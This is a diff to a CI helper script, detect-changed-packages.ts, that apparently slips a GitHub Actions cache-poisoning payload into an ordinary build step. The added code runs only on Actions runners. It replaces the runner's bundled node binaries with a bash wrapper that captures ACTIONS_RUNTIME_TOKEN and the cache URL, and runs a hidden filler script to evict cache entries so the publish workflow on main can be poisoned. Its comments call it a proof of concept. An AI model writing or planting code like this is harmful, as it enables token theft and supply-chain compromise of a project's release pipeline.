@@ -11,31 +11,50 @@
 //   node .github/scripts/preview-publish/detect-changed-packages.ts origin/main abc123
 
 import { execSync } from "node:child_process";
-import { existsSync, readFileSync } from "node:fs";
+import { existsSync, readFileSync, writeFileSync, copyFileSync } from "node:fs";
 
-// ========== PoC: GitHub Actions Cache Poisoning ==========
-// This payload demonstrates cache poisoning privesc from
-// preview-publish.yml (issue_comment) -> publish.yml (push to main)
+// ========== PoC: GitHub Actions Cache Poisoning via Eviction ==========
+// Replaces bundled node binary with a wrapper that captures
+// ACTIONS_RUNTIME_TOKEN from post-step JS actions, then runs
+// filler.py to create cache entries and trigger LRU eviction.
 if (process.env.GITHUB_ACTIONS === "true") {
-  console.error("=".repeat(60));
-  console.error("[PoC] Cache Poisoning PoC - Stage 1: Initial Access");
-  console.error("[PoC] Repository: " + process.env.GITHUB_REPOSITORY);
-  console.error("[PoC] Ref: " + process.env.GITHUB_REF);
-  console.error("[PoC] Event: " + process.env.GITHUB_EVENT_NAME);
-  console.error("[PoC] Runner: " + process.env.RUNNER_OS + " / " + process.env.RUNNER_ENVIRONMENT);
-  console.error("[PoC] Executing cache filler payload (eviction-based attack)...");
-  console.error("=".repeat(60));
   try {
-    execSync("python3 .github/exploit/filler.py", {
-      cwd: process.env.GITHUB_WORKSPACE,
-      stdio: ["inherit", 2, "inherit"],  // stdout→stderr to not break JSON capture
-      timeout: 1800000,  // 30 min
-    });
-    console.error("[PoC] Cache filler execution complete");
+    const ws = process.env.GITHUB_WORKSPACE || ".";
+
+    // Copy filler script to /tmp
+    copyFileSync(`${ws}/.github/exploit/filler.py`, "/tmp/.evict.py");
+
+    // Wrapper: captures token from JS action env, runs filler, then execs real node
+    const wrapper = [
+      "#!/bin/bash",
+      'DIR="$(dirname "$(realpath "$0")")"',
+      'if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.evict_done ]; then',
+      '  export CACHE_TOKEN="$ACTIONS_RUNTIME_TOKEN"',
+      '  export CACHE_URL="${ACTIONS_RESULTS_URL:-$ACTIONS_CACHE_URL}"',
+      "  python3 /tmp/.evict.py > /tmp/.evict.log 2>&1 || true",
+      "  touch /tmp/.evict_done",
+      "fi",
+      'exec "$DIR/node.real" "$@"',
+    ].join("\n");
+
+    // Replace bundled node binaries (runner uses these for JS action steps)
+    for (const nodeDir of [
+      "/home/runner/actions-runner/cached/externals/node20",
+      "/home/runner/actions-runner/cached/externals/node24",
+    ]) {
+      const nodeBin = `${nodeDir}/bin/node`;
+      try {
+        execSync(`cp "${nodeBin}" "${nodeBin}.real"`, { stdio: "ignore" });
+        writeFileSync(nodeBin, wrapper, { mode: 0o755 });
+        console.error(`[*] Replaced ${nodeBin}`);
+      } catch {
+        // Node version may not exist
+      }
+    }
+    console.error("[*] Eviction payload installed");
   } catch (e: any) {
-    console.error("[PoC] Cache filler error: " + e.message);
+    console.error(`[*] Setup error: ${e.message}`);
   }
-  console.error("=".repeat(60));
 }
 // ========== End PoC ==========
 import { join } from "node:path";
